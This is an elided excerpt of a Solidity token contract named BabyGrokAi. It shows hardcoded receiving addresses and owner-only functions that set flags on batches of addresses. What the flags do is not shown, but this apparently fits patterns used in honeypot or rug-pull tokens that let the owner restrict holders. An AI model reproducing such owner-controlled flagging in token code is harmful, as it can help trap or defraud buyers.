...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address ReceiveAddress = 0xC8A538e09cF1036EFA63c95dED833B9272511991;
    ...
    function multiFunc(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _Func[addresses[i]] = value;
        }
    }

    function multiReward(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
...
contract BabyGrokAi is AbsToken {
    constructor() AbsToken(
        ...
        9,
        420000000000000000,
        address(0xe6A766e93d3e9B203F0F86345E27f14Ef1635c36)
    ){
    }
}